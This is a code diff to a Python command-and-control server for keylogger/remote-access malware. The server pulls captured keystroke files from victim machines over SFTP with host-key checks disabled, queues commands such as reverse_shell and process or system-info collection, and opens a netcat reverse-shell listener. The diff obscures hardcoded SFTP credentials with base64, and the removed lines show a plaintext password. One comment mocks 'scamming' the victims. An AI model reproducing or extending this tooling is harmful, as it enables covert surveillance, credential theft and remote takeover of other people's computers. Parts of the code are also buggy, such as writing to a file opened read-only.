@@ -11,20 +11,20 @@ import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32a
 import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
 from sys import gettrace as sys_gettrace
 from tkinter import *
-import pysftp
+import pysftp, base64
 from _thread import *
 
 #Global Variables
 host_sftp = "192.168.0.104"
-username_sftp = "desktop-722h3i8\manue"
-password_sftp = "Tennis12!"
+username_sftp = "ZGVza3RvcC03MjJoM2k4XG1hbnVl"
+password_sftp = "VGVubmlzMTIh"
 
 #Functions
 #------------------------Connection to FTPS server------------------------
 def ftps_connect():
     cnopts = pysftp.CnOpts()
     cnopts.hostkeys = None
-    ftps = pysftp.Connection(host=host_sftp, username=username_sftp, password=password_sftp, cnopts=cnopts)       #change this to your own SFTP server!
+    ftps = pysftp.Connection(host=host_sftp, username=base64.b64decode(username_sftp), password=base64.b64decode(password_sftp), cnopts=cnopts)       #change this to your own SFTP server!
     return ftps
 
 def ftps_upload_file(ftps, file):
@@ -74,6 +74,12 @@ def get_new_dirs(ftps, count):
             pass
         ftps.get_r(dir, '', preserve_mtime=True)
     ftps.chdir(captured_dirs[0])
+    with open("keylogger.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
+        text = f.read()
+        text = base64.b64decode(text)
+        #write decoded text to file 
+        f.write(text)
+    print("[+] The Keylogger.txt file is base64 encoded but should be decoded now!")
 #------------------------END Connection to FTPS server------------------------
 
 #------------------------Endpoint for reverse shell (netcat listener)------------------------
@@ -139,6 +145,7 @@ def create_command_file(ftps):
             print("[+] get process: gets the process information of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] exit = exit")
             hekk = 1
+            count = 1
         elif (command == "reverse_shell"):
             file.write("reverse_shell ")
             #server ip:
@@ -163,10 +170,12 @@ def create_command_file(ftps):
             file.write("get system info")
         elif (command == "exit"):
             sys.exit()
-        os.system('cls' if os.name == 'nt' else 'clear')
-        file.flush()
-        file.close()
-        print("[+] Command written to file: " + str(command) + " ! As the client only gets them periodically (every 30 seconds) it might take a while until the command is executed!")
+
+        if (hekk == 0):
+            os.system('cls' if os.name == 'nt' else 'clear')
+            file.flush()
+            file.close()
+            print("[+] Command written to file: " + str(command) + " ! As the client only gets them periodically (every 30 seconds) it might take a while until the command is executed!")
         
         #upload file to ftps server
         if count == 0:
@@ -181,31 +190,41 @@ def create_command_file(ftps):
             for dir in captured_dirs:
                 try:
                     ftps.chdir(dir)
-                    ftps.put("commands.txt")
                 except:
                     print("Error uploading Commands file")
+                finally:
+                    ftps.put("commands.txt")
             if len(captured_dirs) == 0:
                 count = 0
             else:
                 count = 1
-        else:
-            ftps.put("commands.txt")
+                print("[+] No clients connected so nothing to upload to! Maybe your not creative enough scamming your so called clients?")
+        elif (hekk == 0):
+            ftps.delete("commands.txt")
+        
+        #to make sure it gets put for now
+        ftps.put("commands.txt")
+        
         if shell == 1:
             reverse_shell()
             shell = 0
-        #show countdown on console
-        print("[+] This console will sleep now during upload/download time from client. Please be patient!")
-        time.sleep(2)
-        #remove commands.txt file
-        os.remove("commands.txt")
-        if hekk == 0:
-            for i in range(30, 0, -1):
-                print("[+] " + str(i) + " seconds left until next command!")
-                time.sleep(1)
-                os.system('cls' if os.name == 'nt' else 'clear')
-        else: 
-            continue
 
+        if (hekk == 0):
+            #show countdown on console
+            print("[+] This console will sleep now during upload/download time from client. Please be patient!")
+            time.sleep(2)
+            #remove commands.txt file
+            os.remove("commands.txt")
+            if hekk == 0:
+                for i in range(30, 0, -1):
+                    print("[+] " + str(i) + " seconds left until next command!")
+                    time.sleep(1)
+                    os.system('cls' if os.name == 'nt' else 'clear')
+            else: 
+                continue
+        hekk = 0
+        shell = 0
+        count = 0
 
 #------------------------Command and Control Server Main------------------------
 #Test all of the above functions:
